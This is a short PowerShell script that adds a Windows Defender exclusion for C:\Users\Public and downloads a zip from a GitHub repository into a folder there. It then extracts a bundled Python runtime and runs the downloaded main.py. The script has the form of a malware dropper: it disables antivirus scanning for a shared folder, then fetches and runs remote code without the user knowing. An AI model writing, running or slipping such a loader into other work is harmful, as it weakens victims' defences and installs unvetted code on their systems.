powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath 'C:\\Users\\Public\\'
$targetDir = "C:\Users\Public\wada"
if (-Not (Test-Path -Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir }
$repoUrl = "https://github.com/Zippy-boy/tests/archive/refs/heads/main.zip"
$zipFilePath = "$env:TEMP\repo.zip"
Invoke-WebRequest -Uri $repoUrl -OutFile $zipFilePath
$extractPath = "$env:TEMP\repo"
Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force
Copy-Item -Path "$extractPath\tests-main\python\*" -Destination $targetDir -Recurse -Force
Remove-Item -Path $zipFilePath -Force
Remove-Item -Path $extractPath -Recurse -Force
Write-Output "Files copied successfully to $targetDir"
$condaTarGzPath = "$targetDir\.conda.tar.gz"
$condaExtractPath = "$targetDir\.conda"
if (-Not (Test-Path -Path $condaExtractPath)) { New-Item -ItemType Directory -Path $condaExtractPath }
& tar -xzf $condaTarGzPath -C $condaExtractPath
Write-Output ".conda.tar.gz extracted successfully to $condaExtractPath"
$pythonExePath = "$condaExtractPath\python.exe"
$mainPyPath = "$targetDir\main.py"
& $pythonExePath $mainPyPath
Write-Output "main.py executed successfully"
